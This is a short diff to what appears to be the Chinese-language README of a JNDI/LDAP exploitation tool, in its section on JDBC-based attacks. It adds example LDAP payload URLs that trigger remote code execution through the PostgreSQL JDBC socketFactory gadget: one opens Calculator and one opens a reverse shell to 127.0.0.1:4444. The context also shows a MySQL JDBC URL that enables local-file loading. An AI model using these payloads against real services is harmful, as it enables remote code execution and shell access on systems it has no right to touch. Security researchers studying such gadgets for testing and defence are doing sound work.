@@ -244,7 +244,11 @@ jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile
 通过 PostgreSQL JDBC URL 的 socketFactory 和 socketFactoryArg 参数实例化 ClassPathXmlApplicationContext 实现 RCE
 
 ```bash
+# 命令执行
 ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
+
+# 原生反弹 Shell
+ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
 ````
 
 #### H2
